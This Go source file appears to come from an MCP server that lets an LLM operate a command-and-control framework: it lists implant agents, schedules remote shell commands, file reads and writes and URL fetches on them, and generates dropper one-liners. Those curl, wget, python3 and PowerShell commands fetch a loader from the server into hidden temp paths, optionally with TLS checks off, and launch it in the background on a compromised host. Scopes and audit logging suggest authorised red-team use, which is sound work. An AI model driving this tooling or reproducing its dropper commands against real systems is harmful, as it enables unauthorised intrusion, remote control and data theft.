// Copyright 2026 Davide Guerri <davide.guerri@gmail.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package mcp

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/dguerri/oast-mcp/internal/auth"
	"github.com/dguerri/oast-mcp/internal/store"
	"github.com/google/uuid"
	gomcp "github.com/modelcontextprotocol/go-sdk/mcp"
)

// ── Input types ───────────────────────────────────────────────────────────────

// AgentListInput holds parameters for agent_list.
type AgentListInput struct {
	ShowExpired bool `json:"show_expired,omitempty" jsonschema:"Include agents whose token has expired (default: false)"`
}

// AgentTaskScheduleInput holds parameters for agent_task_schedule.
type AgentTaskScheduleInput struct {
	AgentID     string         `json:"agent_id" jsonschema:"The agent ID to schedule the task for"`
	Capability  string         `json:"capability" jsonschema:"One of: exec, interactive_exec, read_file, write_file, fetch_url, system_info"`
	Params      map[string]any `json:"params,omitempty" jsonschema:"Parameters for the capability (see tool description for schema per capability)"`
	TimeoutSecs float64        `json:"timeout_secs,omitempty" jsonschema:"Task execution timeout in seconds (default 600, max 86400)"`
}

// AgentTaskStatusInput holds parameters for agent_task_status.
type AgentTaskStatusInput struct {
	TaskID      string   `json:"task_id" jsonschema:"The task ID to check"`
	Wait        *bool    `json:"wait,omitempty" jsonschema:"Block until the task completes or the wait timeout elapses (default: true). Set to false to return immediately."`
	TimeoutSecs *float64 `json:"timeout_secs,omitempty" jsonschema:"Wait timeout in seconds (default 30, max 120). Only applies when wait=true."`
}

// AgentTaskCancelInput holds parameters for agent_task_cancel.
type AgentTaskCancelInput struct {
	TaskID  string `json:"task_id" jsonschema:"The task ID to cancel"`
	AgentID string `json:"agent_id" jsonschema:"The agent ID that owns the task (needed to route the cancel signal)"`
}

// AgentTaskInteractInput holds parameters for agent_task_interact.
type AgentTaskInteractInput struct {
	TaskID      string   `json:"task_id" jsonschema:"The task ID of the interactive_exec task"`
	Stdin       string   `json:"stdin,omitempty" jsonschema:"Data to write to the process stdin. C-style escapes are interpreted: \\n (newline), \\r (CR), \\t (tab), \\\\ (backslash), \\xNN (hex byte, e.g. \\x03 for Ctrl-C)"`
	Binary      bool     `json:"binary,omitempty" jsonschema:"When true, stdin is expected as base64 and stdout/stderr are returned as base64 (default: false)"`
	Wait        *bool    `json:"wait,omitempty" jsonschema:"Block until output is available or timeout elapses (default: true)"`
	TimeoutSecs *float64 `json:"timeout_secs,omitempty" jsonschema:"Wait timeout in seconds (default 30, max 120). Only applies when wait=true."`
}

// AgentDropperGenerateInput holds parameters for agent_dropper_generate.
type AgentDropperGenerateInput struct {
	AgentID  string `json:"agent_id" jsonschema:"Meaningful identifier for this agent — use the target hostname or role"`
	OsArch   string `json:"os_arch" jsonschema:"Target platform, e.g. linux/amd64, linux/arm64, windows/amd64"`
	TTL      string `json:"ttl" jsonschema:"Token lifetime in Go duration format, e.g. '2h', '24h'"`
	Delivery string `json:"delivery,omitempty" jsonschema:"'url' (default): returns curl/wget commands to fetch the agent. 'inline': embeds the agent as base64 for air-gapped targets"`
	Insecure bool   `json:"insecure,omitempty" jsonschema:"Skip TLS certificate verification. Use ONLY when the target lacks a CA bundle (e.g. minimal containers)."`
}

// ── Constants ─────────────────────────────────────────────────────────────────

const (
	defaultWaitTimeoutSecs = 30
	maxWaitTimeoutSecs     = 120
	waitPollInterval       = 500 * time.Millisecond
)

// ── Tool registration ─────────────────────────────────────────────────────────

// registerAgentTools registers all agent management tools with the MCP server.
func (s *Server) registerAgentTools() {
	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name: "agent_list",
		Description: "List agents for the current tenant. Returns agent_id, status (online/offline), " +
			"capabilities, and expiration. Pass show_expired=true to include expired agents.",
	}, s.handleAgentList)

	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name: "agent_task_schedule",
		Description: "Schedule a task on an online agent. Tasks run asynchronously — use agent_task_status to get results.\n\n" +
			"Capabilities and params:\n" +
			"  exec             — {\"cmd\": \"<shell command>\"}\n" +
			"  interactive_exec — {\"command\": \"<shell command>\"} — use agent_task_interact for I/O\n" +
			"  read_file        — {\"path\": \"<absolute path>\"} — returns base64 content\n" +
			"  write_file       — {\"path\": \"<path>\", \"content_b64\": \"<base64>\", \"mode\": \"0644\"}\n" +
			"  fetch_url        — {\"url\": \"<url>\"}\n" +
			"  system_info      — {} — returns hostname, OS, arch, user\n\n" +
			"timeout_secs sets the task deadline (default 600s). Use agent_task_cancel to abort early.",
	}, s.handleAgentTaskSchedule)

	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name: "agent_task_status",
		Description: "Get the result of a scheduled task. Status: pending → running → done | error.\n\n" +
			"By default (wait=true), blocks until the task completes or timeout_secs elapses (default 30, max 120). " +
			"Set wait=false to return immediately.\n\n" +
			"On success, 'result' contains capability output (exec: {output, exit_code}; " +
			"read_file: {content} base64; fetch_url: {status, body} base64). " +
			"On error, 'error' has the message.",
	}, s.handleAgentTaskStatus)

	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name: "agent_task_cancel",
		Description: "Cancel a pending or running task. The agent kills any subprocess immediately. " +
			"Fails if the task is already in a terminal state.",
	}, s.handleAgentTaskCancel)

	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name: "agent_task_interact",
		Description: "Send input to and read output from an interactive_exec task.\n\n" +
			"Workflow:\n" +
			"  1. Schedule with capability=\"interactive_exec\"\n" +
			"  2. Call agent_task_interact(task_id=...) to read initial output\n" +
			"  3. Send input: agent_task_interact(task_id=..., stdin=\"command\\n\")\n" +
			"  4. Repeat until running=false (exit_code is then present)\n\n" +
			"Stdin supports C-style escapes: \\n, \\t, \\x03 (Ctrl-C), \\x04 (Ctrl-D). " +
			"Set binary=true for base64 I/O. Blocks by default until output arrives or timeout_secs elapses.",
	}, s.handleAgentTaskInteract)

	targets := scanLoaderTargets(s.binDir)
	targetList := strings.Join(targets, ", ")
	if targetList == "" {
		targetList = "(none — run 'make build-loaders' on the server)"
	}
	dropperDesc := fmt.Sprintf(
		"Generate a one-liner command to deploy an agent on a target where you have code execution. "+
			"Returns ready-to-run shell commands with multiple fallbacks.\n\n"+
			"The command runs in the background and returns immediately. "+
			"The agent typically comes online within a few seconds — poll agent_list to confirm.\n\n"+
			"Delivery modes:\n"+
			"  url    — fetches the agent over HTTPS (default). Returns curl_cmd, wget_cmd, python3_cmd.\n"+
			"  inline — agent embedded as base64, no outbound HTTP needed. Returns b64_cmd, python3_b64_cmd.\n\n"+
			"Try the returned commands in order until one succeeds. "+
			"If none work, add -f to the command to stay in foreground and see errors.\n\n"+
			"Workflow:\n"+
			"  1. Determine target OS/arch (e.g. uname -m).\n"+
			"  2. Call this tool with a descriptive agent_id, the os_arch, and a ttl.\n"+
			"  3. Run the first available command on the target.\n"+
			"  4. Poll agent_list until the agent shows online.\n"+
			"  5. Use agent_task_schedule to run tasks on the agent.\n\n"+
			"Available targets: %s", targetList)

	gomcp.AddTool(s.mcp, &gomcp.Tool{
		Name:        "agent_dropper_generate",
		Description: dropperDesc,
	}, s.handleAgentDropperGenerate)
}

// ── Handlers ──────────────────────────────────────────────────────────────────

// handleAgentList handles the agent_list tool call.
func (s *Server) handleAgentList(ctx context.Context, _ *gomcp.CallToolRequest, input AgentListInput) (*gomcp.CallToolResult, any, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.list", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agents, err := s.store.ListAgents(ctx, claims.TenantID, input.ShowExpired)
	if err != nil {
		s.logger.Error("failed to list agents", "error", err)
		return toolError("failed to list agents: " + err.Error())
	}

	s.audit.Log(s.newAuditEvent(ctx, "agent.list", "ok"))

	type agentView struct {
		AgentID      string   `json:"agent_id"`
		TenantID     string   `json:"tenant_id"`
		Name         string   `json:"name"`
		Status       string   `json:"status"`
		Capabilities []string `json:"capabilities"`
		Insecure     bool     `json:"insecure"`
		RegisteredAt string   `json:"registered_at"`
		LastSeenAt   *string  `json:"last_seen_at,omitempty"`
		ExpiresAt    *string  `json:"expires_at,omitempty"`
	}

	views := make([]agentView, 0, len(agents))
	for _, a := range agents {
		v := agentView{
			AgentID:      a.AgentID,
			TenantID:     a.TenantID,
			Name:         a.Name,
			Status:       a.Status,
			Capabilities: a.Capabilities,
			Insecure:     a.Insecure,
			RegisteredAt: a.RegisteredAt.Format(time.RFC3339),
		}
		if a.LastSeenAt != nil {
			ls := a.LastSeenAt.Format(time.RFC3339)
			v.LastSeenAt = &ls
		}
		if a.ExpiresAt != nil {
			ea := a.ExpiresAt.Format(time.RFC3339)
			v.ExpiresAt = &ea
		}
		views = append(views, v)
	}
	return toolJSON(views)
}

// handleAgentTaskSchedule handles the agent_task_schedule tool call.
func (s *Server) handleAgentTaskSchedule(ctx context.Context, _ *gomcp.CallToolRequest, input AgentTaskScheduleInput) (*gomcp.CallToolResult, any, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.schedule", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	agentID := input.AgentID
	if agentID == "" {
		return toolError("agent_id is required")
	}
	capability := input.Capability
	if capability == "" {
		return toolError("capability is required")
	}

	if _, err := s.store.GetAgent(ctx, agentID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("agent not found")
		}
		s.logger.Error("failed to get agent", "error", err)
		return toolError("failed to get agent")
	}

	timeoutSecs := store.DefaultTaskTimeoutSecs
	if input.TimeoutSecs > 0 {
		timeoutSecs = int(input.TimeoutSecs)
		if timeoutSecs > 86400 {
			return toolError("timeout_secs must not exceed 86400 (24 hours)")
		}
	}

	taskID := uuid.New().String()
	now := time.Now().UTC()
	timeoutAt := now.Add(time.Duration(timeoutSecs) * time.Second)
	task := &store.Task{
		TaskID:      taskID,
		AgentID:     agentID,
		TenantID:    claims.TenantID,
		ScheduledBy: claims.Subject,
		Capability:  capability,
		Params:      input.Params,
		Status:      "pending",
		CreatedAt:   now,
		TimeoutSecs: timeoutSecs,
		TimeoutAt:   &timeoutAt,
	}
	if err := s.store.EnqueueTask(ctx, task); err != nil {
		s.logger.Error("failed to enqueue task", "error", err)
		return toolError("failed to schedule task: " + err.Error())
	}

	ev := s.newAuditEvent(ctx, "agent.task.schedule", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	return toolJSON(map[string]any{
		"task_id":      taskID,
		"agent_id":     agentID,
		"capability":   capability,
		"status":       "pending",
		"timeout_secs": timeoutSecs,
		"timeout_at":   timeoutAt.Format(time.RFC3339),
		"created_at":   now.Format(time.RFC3339),
	})
}

// handleAgentTaskCancel handles the agent_task_cancel tool call.
func (s *Server) handleAgentTaskCancel(ctx context.Context, _ *gomcp.CallToolRequest, input AgentTaskCancelInput) (*gomcp.CallToolResult, any, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.cancel", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := input.TaskID
	if taskID == "" {
		return toolError("task_id is required")
	}
	agentID := input.AgentID
	if agentID == "" {
		return toolError("agent_id is required")
	}

	if _, err := s.store.GetTask(ctx, taskID, claims.TenantID); err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task for cancel", "error", err)
		return toolError("failed to get task")
	}

	// Fall back to store-only cancel when no agent server is configured.
	if s.agentSrv != nil {
		if err := s.agentSrv.SendCancel(ctx, taskID, agentID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	} else {
		if err := s.store.CancelTask(ctx, taskID, claims.TenantID); err != nil {
			if errors.Is(err, store.ErrNotFound) {
				return toolError("task is already in a terminal state")
			}
			s.logger.Error("failed to cancel task", "error", err)
			return toolError("failed to cancel task")
		}
	}

	ev := s.newAuditEvent(ctx, "agent.task.cancel", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	return toolJSON(map[string]any{
		"task_id":  taskID,
		"agent_id": agentID,
		"status":   "cancelled",
	})
}

// handleAgentTaskInteract handles the agent_task_interact tool call.
func (s *Server) handleAgentTaskInteract(ctx context.Context, _ *gomcp.CallToolRequest, input AgentTaskInteractInput) (*gomcp.CallToolResult, any, error) {
	claims, task, errResult, err := s.validateInteractRequest(ctx, input.TaskID)
	if err != nil {
		return nil, nil, err
	}
	if errResult != nil {
		return errResult, nil, nil
	}

	taskID := task.TaskID

	// Send stdin if provided (interpret C-style escapes, unless binary mode).
	stdinData := input.Stdin
	if stdinData != "" {
		if !input.Binary {
			stdinData = unescapeStdin(stdinData)
		}
		if err := s.agentSrv.SendStdin(taskID, task.AgentID, claims.TenantID, stdinData); err != nil {
			return toolError("failed to send stdin: " + err.Error())
		}
	}

	// Get the interactive buffer.
	buf := s.agentSrv.GetInteractiveBuf(taskID, task.AgentID, claims.TenantID)
	if buf == nil {
		// Task may have already completed or agent disconnected.
		if isTerminalStatus(task.Status) {
			return toolJSON(map[string]any{
				"stdout":  "",
				"stderr":  "",
				"running": false,
				"error":   task.Err,
			})
		}
		return toolError("interactive buffer not found — agent may have disconnected")
	}

	wait, waitTimeout := parseWaitParams(input.Wait, input.TimeoutSecs)
	deadline := time.Now().Add(time.Duration(waitTimeout) * time.Second)

	stdout, stderr, done, exitCode, errMsg := buf.Drain(wait, deadline)

	ev := s.newAuditEvent(ctx, "agent.task.interact", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	resp := map[string]any{
		"stdout":  stdout,
		"stderr":  stderr,
		"running": !done,
	}
	if done && exitCode != nil {
		resp["exit_code"] = *exitCode
	}
	if done && errMsg != "" {
		resp["error"] = errMsg
	}
	return toolJSON(resp)
}

// validateInteractRequest performs auth, rate-limit, and task validation for
// agent_task_interact. Returns (claims, task, nil, nil) on success, or
// (nil, nil, errorResult, nil) for tool-level errors.
func (s *Server) validateInteractRequest(ctx context.Context, taskID string) (*auth.Claims, *store.Task, *gomcp.CallToolResult, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		r, _, _ := toolError("unauthorized")
		return nil, nil, r, nil
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.interact", "denied"))
		r, _, _ := toolError("insufficient scope: agent:admin required")
		return nil, nil, r, nil
	}
	if !s.rl.Allow(claims.TenantID) {
		r, _, _ := toolError("rate limit exceeded")
		return nil, nil, r, nil
	}

	if taskID == "" {
		r, _, _ := toolError("task_id is required")
		return nil, nil, r, nil
	}

	task, err := s.store.GetTask(ctx, taskID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			r, _, _ := toolError("task not found")
			return nil, nil, r, nil
		}
		s.logger.Error("failed to get task", "error", err)
		r, _, _ := toolError("failed to get task")
		return nil, nil, r, nil
	}

	if task.Capability != "interactive_exec" {
		r, _, _ := toolError("task is not interactive — use agent_task_status instead")
		return nil, nil, r, nil
	}

	if s.agentSrv == nil {
		r, _, _ := toolError("agent server not configured")
		return nil, nil, r, nil
	}

	return claims, task, nil, nil
}

// parseWaitParams extracts the wait (bool) and timeout_secs (int) parameters.
// wait defaults to true when nil. timeout defaults to defaultWaitTimeoutSecs when nil;
// an explicit 0 is clamped to the minimum of 1.
func parseWaitParams(wait *bool, timeoutSecs *float64) (bool, int) {
	doWait := true
	if wait != nil {
		doWait = *wait
	}

	timeout := defaultWaitTimeoutSecs
	if timeoutSecs != nil {
		timeout = int(*timeoutSecs)
	}
	if timeout < 1 {
		timeout = 1
	}
	if timeout > maxWaitTimeoutSecs {
		timeout = maxWaitTimeoutSecs
	}
	return doWait, timeout
}

// unescapeStdin interprets C-style escape sequences in s so that LLMs can
// write e.g. "id\n" and have it arrive as a real newline.
// Supported: \n \r \t \a \b \\ \xNN.
func unescapeStdin(s string) string {
	var buf strings.Builder
	buf.Grow(len(s))
	for i := 0; i < len(s); i++ {
		if s[i] != '\\' || i+1 >= len(s) {
			buf.WriteByte(s[i])
			continue
		}
		switch s[i+1] {
		case 'n':
			buf.WriteByte('\n')
			i++
		case 'r':
			buf.WriteByte('\r')
			i++
		case 't':
			buf.WriteByte('\t')
			i++
		case 'a':
			buf.WriteByte('\a')
			i++
		case 'b':
			buf.WriteByte('\b')
			i++
		case '\\':
			buf.WriteByte('\\')
			i++
		case 'x':
			if i+3 < len(s) {
				if val, err := strconv.ParseUint(s[i+2:i+4], 16, 8); err == nil {
					buf.WriteByte(byte(val))
					i += 3
				} else {
					buf.WriteByte('\\')
				}
			} else {
				buf.WriteByte('\\')
			}
		default:
			buf.WriteByte('\\')
		}
	}
	return buf.String()
}

// handleAgentTaskStatus handles the agent_task_status tool call.
func (s *Server) handleAgentTaskStatus(ctx context.Context, _ *gomcp.CallToolRequest, input AgentTaskStatusInput) (*gomcp.CallToolResult, any, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.task.status", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	taskID := input.TaskID
	if taskID == "" {
		return toolError("task_id is required")
	}

	wait, waitTimeout := parseWaitParams(input.Wait, input.TimeoutSecs)

	task, err := s.store.GetTask(ctx, taskID, claims.TenantID)
	if err != nil {
		if errors.Is(err, store.ErrNotFound) {
			return toolError("task not found")
		}
		s.logger.Error("failed to get task", "error", err)
		return toolError("failed to get task")
	}

	timedOut := false
	if wait && !isTerminalStatus(task.Status) {
		task, timedOut, err = s.pollUntilTaskDone(ctx, taskID, claims.TenantID, time.Now().Add(time.Duration(waitTimeout)*time.Second))
		if err != nil {
			s.logger.Error("failed to poll task", "error", err)
			return toolError("failed to poll task")
		}
	}

	ev := s.newAuditEvent(ctx, "agent.task.status", "ok")
	ev.Resource = taskID
	s.audit.Log(ev)

	type taskView struct {
		TaskID      string         `json:"task_id"`
		AgentID     string         `json:"agent_id"`
		Capability  string         `json:"capability"`
		Status      string         `json:"status"`
		CreatedAt   string         `json:"created_at"`
		StartedAt   *string        `json:"started_at,omitempty"`
		CompletedAt *string        `json:"completed_at,omitempty"`
		Result      map[string]any `json:"result,omitempty"`
		Err         string         `json:"error,omitempty"`
		TimedOut    *bool          `json:"timed_out,omitempty"`
	}

	v := taskView{
		TaskID:     task.TaskID,
		AgentID:    task.AgentID,
		Capability: task.Capability,
		Status:     task.Status,
		CreatedAt:  task.CreatedAt.Format(time.RFC3339),
		Result:     task.Result,
		Err:        task.Err,
	}
	if wait {
		v.TimedOut = &timedOut
	}
	if task.StartedAt != nil {
		sa := task.StartedAt.Format(time.RFC3339)
		v.StartedAt = &sa
	}
	if task.CompletedAt != nil {
		ca := task.CompletedAt.Format(time.RFC3339)
		v.CompletedAt = &ca
	}
	return toolJSON(v)
}

// isTerminalStatus returns true if the task status is a terminal state.
func isTerminalStatus(status string) bool {
	return status == "done" || status == "error"
}

// pollUntilTaskDone polls the store every 500ms until the task reaches a
// terminal state, the deadline elapses, or the context is cancelled.
func (s *Server) pollUntilTaskDone(ctx context.Context, taskID, tenantID string, deadline time.Time) (*store.Task, bool, error) {
	ticker := time.NewTicker(waitPollInterval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			// Context cancelled — return last known state.
			task, err := s.store.GetTask(ctx, taskID, tenantID)
			if err != nil {
				return nil, false, err
			}
			return task, true, nil
		case <-ticker.C:
			task, err := s.store.GetTask(ctx, taskID, tenantID)
			if err != nil {
				return nil, false, err
			}
			if isTerminalStatus(task.Status) {
				return task, false, nil
			}
			if !time.Now().Before(deadline) {
				return task, true, nil
			}
		}
	}
}

// handleAgentDropperGenerate handles the agent_dropper_generate tool call.
func (s *Server) handleAgentDropperGenerate(ctx context.Context, _ *gomcp.CallToolRequest, input AgentDropperGenerateInput) (*gomcp.CallToolResult, any, error) {
	claims, ok := claimsFromCtx(ctx)
	if !ok {
		return toolError("unauthorized")
	}
	if err := auth.RequireScope(claims, "agent:admin"); err != nil {
		s.audit.Log(s.newAuditEvent(ctx, "agent.dropper.generate", "denied"))
		return toolError("insufficient scope: agent:admin required")
	}
	if !s.rl.Allow(claims.TenantID) {
		return toolError("rate limit exceeded")
	}

	delivery := input.Delivery
	if delivery == "" {
		delivery = "url"
	}

	ttl, errMsg := parseDropperParams(input.AgentID, input.OsArch, input.TTL, delivery)
	if errMsg != "" {
		return toolError(errMsg)
	}

	loaderName := loaderNameForArch(input.OsArch)
	loaderBytes, err := os.ReadFile(filepath.Join(s.binDir, loaderName))
	if err != nil {
		return toolError("no loader available for os_arch: " + input.OsArch +
			" (run 'make build-loaders' on the server)")
	}

	// The JWT embeds both tenantID and agentID; the agent server treats
	// these claims as the sole source of identity.
	token, err := s.auth.IssueAgent(claims.TenantID, input.AgentID, []string{"agent:connect"}, ttl)
	if err != nil {
		s.logger.Error("failed to mint agent token", "err", err)
		return toolError("failed to mint token")
	}

	expiresAt := time.Now().Add(ttl).UTC()
	loaderB64 := base64.StdEncoding.EncodeToString(loaderBytes)
	downloadURL := s.agentBaseURL + "/dl/" + loaderName
	loaderFlags := ""
	if input.Insecure {
		loaderFlags = "-k "
	}
	launchArgs := fmt.Sprintf("%s%s %s %s", loaderFlags, s.agentBaseURL, token, input.AgentID)

	cmds := buildDropperCmds(input.OsArch, downloadURL, loaderB64, launchArgs, input.Insecure)

	ev := s.newAuditEvent(ctx, "agent.dropper.generate", "ok")
	ev.Resource = input.AgentID
	ev.Detail = map[string]any{"os_arch": input.OsArch, "delivery": delivery, "insecure": input.Insecure}
	s.audit.Log(ev)

	result := map[string]any{
		"agent_id":   input.AgentID,
		"os_arch":    input.OsArch,
		"token":      token,
		"expires_at": expiresAt.Format(time.RFC3339),
		"server_url": s.agentBaseURL,
		"delivery":   delivery,
	}
	if delivery == "url" {
		result["download_url"] = downloadURL
		result["curl_cmd"] = cmds.curlCmd
		if cmds.wgetCmd != "" {
			result["wget_cmd"] = cmds.wgetCmd
		}
		if cmds.python3Cmd != "" {
			result["python3_cmd"] = cmds.python3Cmd
		}
	} else {
		result["b64_cmd"] = cmds.b64Cmd
		if cmds.python3B64Cmd != "" {
			result["python3_b64_cmd"] = cmds.python3B64Cmd
		}
	}
	return toolJSON(result)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// parseDropperParams validates agent dropper parameters and returns the parsed TTL.
// Returns a non-empty error message string on failure.
func parseDropperParams(agentID, osArch, ttlStr, delivery string) (time.Duration, string) {
	if agentID == "" || osArch == "" || ttlStr == "" {
		return 0, "agent_id, os_arch, and ttl are all required"
	}
	if delivery != "url" && delivery != "inline" {
		return 0, "delivery must be 'url' or 'inline'"
	}
	ttl, err := time.ParseDuration(ttlStr)
	if err != nil || ttl <= 0 {
		return 0, "invalid ttl: use Go duration format e.g. '2h', '24h'"
	}
	if ttl > 168*time.Hour {
		return 0, "ttl must not exceed 168h (7 days)"
	}
	return ttl, ""
}

// loaderNameForArch returns the loader binary filename for the given os/arch pair.
func loaderNameForArch(osArch string) string {
	// os_arch uses slash separator (e.g. "linux/amd64") but filenames use dashes.
	normalized := strings.ReplaceAll(osArch, "/", "-")
	name := "loader-" + normalized
	if strings.HasPrefix(normalized, "windows-") {
		name += ".exe"
	}
	return name
}

type dropperCmds struct {
	curlCmd       string
	wgetCmd       string
	python3Cmd    string
	b64Cmd        string
	python3B64Cmd string
}

func buildDropperCmds(osArch, downloadURL, loaderB64, launchArgs string, insecure bool) dropperCmds {
	// When insecure, add -k to curl and --no-check-certificate to wget so the
	// download tools also skip TLS verification (the loader -k flag only
	// affects Stage 2 download, not the Stage 1 fetch by curl/wget).
	curlFlag := "-fsSL"
	wgetFlag := "-qO"
	py3TLS := ""
	if insecure {
		curlFlag = "-fskSL"
		wgetFlag = "--no-check-certificate -qO"
		py3TLS = "import ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE; "
	}

	if strings.HasPrefix(osArch, "windows/") || strings.HasPrefix(osArch, "windows-") {
		return dropperCmds{
			curlCmd: fmt.Sprintf(
				`curl.exe %s "%s" -o "$env:TEMP\l.exe" && & "$env:TEMP\l.exe" %s`,
				curlFlag, downloadURL, launchArgs),
			b64Cmd: fmt.Sprintf(
				`[IO.File]::WriteAllBytes("$env:TEMP\l.exe",[Convert]::FromBase64String("%s")); & "$env:TEMP\l.exe" %s`,
				loaderB64, launchArgs),
		}
	}

	py3URLCmd := fmt.Sprintf(
		`python3 -c "%simport urllib.request,os; urllib.request.urlretrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
		py3TLS, downloadURL, launchArgs)
	if insecure {
		py3URLCmd = fmt.Sprintf(
			`python3 -c "%simport urllib.request,os; opener=urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx)); opener.retrieve('%s','/tmp/.l'); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			py3TLS, downloadURL, launchArgs)
	}

	return dropperCmds{
		curlCmd: fmt.Sprintf(
			`curl %s '%s' -o /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			curlFlag, downloadURL, launchArgs),
		wgetCmd: fmt.Sprintf(
			`wget %s /tmp/.l '%s' && chmod +x /tmp/.l && /tmp/.l %s`,
			wgetFlag, downloadURL, launchArgs),
		python3Cmd: py3URLCmd,
		b64Cmd: fmt.Sprintf(
			`printf '%s' | base64 -d > /tmp/.l && chmod +x /tmp/.l && /tmp/.l %s`,
			loaderB64, launchArgs),
		python3B64Cmd: fmt.Sprintf(
			`python3 -c "import base64,os; open('/tmp/.l','wb').write(base64.b64decode('%s')); os.chmod('/tmp/.l',0o700)" && /tmp/.l %s`,
			loaderB64, launchArgs),
	}
}
